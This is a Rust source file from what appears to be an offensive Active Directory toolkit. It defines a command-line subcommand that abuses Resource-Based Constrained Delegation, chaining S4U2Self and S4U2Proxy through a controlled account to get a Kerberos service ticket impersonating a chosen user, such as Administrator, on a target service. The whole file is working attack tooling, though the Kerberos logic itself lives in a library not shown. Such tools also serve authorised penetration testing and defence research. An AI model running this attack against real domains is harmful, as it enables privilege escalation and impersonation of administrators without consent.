//! Resource-Based Constrained Delegation abuse: S4U2Self + S4U2Proxy to
//! obtain an impersonation ticket to the target service.

use anyhow::Result;
use clap::Parser;

#[derive(Parser)]
pub(crate) struct RbcdArgs {
    #[arg(long)]
    pub kdc: String,
    #[arg(long)]
    pub realm: String,
    /// Controlled account (the RBCD trustee) sAMAccountName
    #[arg(long)]
    pub account: String,
    /// Controlled account password
    #[arg(long, default_value = "")]
    pub account_password: String,
    /// User to impersonate, e.g. Administrator
    #[arg(long)]
    pub impersonate: String,
    /// Target service SPN, e.g. cifs/dc01.corp.local
    #[arg(long)]
    pub target_spn: String,
}

/// Full RBCD attack: S4U2Self + S4U2Proxy to obtain an impersonation ticket to the target.
pub(crate) async fn rbcd(mut a: RbcdArgs) -> Result<()> {
    a.account_password = crate::resolve_secret(&a.account_password, "ADHAMMER_PASSWORD")?;
    let etype = adhammer_kerberos::rbcd_impersonate(
        &a.account,
        &a.account_password,
        &a.realm,
        &a.kdc,
        &a.impersonate,
        &a.target_spn,
    )
    .await?;
    println!(
        "[+] got service ticket for {} as {} (enc-part etype {etype})",
        a.target_spn, a.impersonate
    );
    println!("    RBCD chain succeeded — impersonation ticket obtained.");
    Ok(())
}
